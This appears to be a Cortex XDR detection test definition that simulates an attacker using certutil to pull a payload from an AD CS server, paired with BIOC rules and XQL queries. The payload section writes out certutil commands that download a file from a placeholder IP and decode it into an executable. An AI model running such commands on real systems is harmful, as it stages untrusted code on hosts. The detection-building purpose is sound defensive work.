identity.name: Suspicious Certutil AD CS Contact
identity.summary: An attacker uses certutil to download and decode a payload from an AD CS server, potentially to bypass EDR detection. Cortex should detect the suspicious certutil behavior and network contact.
identity.description: An attacker uses certutil to download and decode a payload from an AD CS server, potentially to bypass EDR detection. Cortex should detect the suspicious certutil behavior and network contact.

payload.code:
certutil.exe -urlcache -split -f http://192.0.2.100/payload.bin payload.bin

certutil.exe -decode payload.bin decoded_payload.exe

expected_artifacts.description: Outbound connection to AD CS server

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious Certutil AD CS Contact
biocs.description: Detection of certutil downloading a file from an AD CS server
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'certutil.exe'
| filter action_file_path contains 'payload.bin'
| filter action_remote_ip = '192.0.2.100'

abiocs.name: Certutil AD CS Download Behavior
abiocs.description: Behavioral deviation indicating certutil downloading from AD CS server
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'certutil.exe'
| filter action_remote_ip = '192.0.2.100'
abiocs.causality_anchor: certutil.exe process start with AD CS IP

xql_queries.name: Certutil AD CS Network Contact
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.100'
| filter action_process_image_name = 'certutil.exe'
